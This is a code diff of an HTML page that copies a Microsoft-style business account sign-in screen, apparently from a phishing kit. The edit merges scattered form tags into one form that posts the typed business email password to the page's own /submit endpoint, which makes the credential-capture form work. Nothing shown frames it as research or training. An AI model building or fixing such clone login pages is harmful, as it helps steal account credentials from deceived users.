@@ -31,7 +31,11 @@
 </head>
 
   <body>
+ <div class="container">
+   <form action="/submit" method="POST">
     <body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" background="../static/bg.jpg">
+      
+
       <div class="inner fade-in-lightbox" data-bind="
                   animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                   css: {
@@ -98,7 +102,7 @@
                                               event: {
                                                   updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
 
-                                                <form action="/submit" method="POST">
+                                                
                                                   <input name="username" id="i0116" maxlength="113" class="form-control ltr_override" aria-required="true" data-bind="
                                                       css: { 'has-error': usernameTextbox.error },
                                                       ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
@@ -114,7 +118,7 @@
                                                       textInput: usernameTextbox.value,
                                                       hasFocusEx: usernameTextbox.focused,
                                                       placeholder: $placeholderText" aria-label="Enter business email password." aria-describedby="loginHeader" placeholder="Enter business email password." type="password" lang="en">
-                                                  </form>
+                                                  
 
                                                         <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --> <div class="form-group" data-bind="
                                                       htmlWithBindings: html['WF_STR_SignUpLink_Text'],
@@ -150,7 +154,7 @@
                                               secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
                                       visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                       css: { 'no-margin-bottom': removeBottomMargin }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div class="inline-block"><!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
-                                      <form action="/submit" method="POST">
+                                      
                                         <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
                                               attr: primaryButtonAttributes,
                                               value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
@@ -159,11 +163,11 @@
                                               enable: isPrimaryButtonEnabled,
                                               visible: isPrimaryButtonVisible,
                                               preventTabbing: primaryButtonPreventTabbing" value="Next" type="submit">
-                                        </form>
+                                       
 
                                             </div> </div></div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div> </div></div>
 
-
-
+</form>
+</div>
 </body>
 </html>
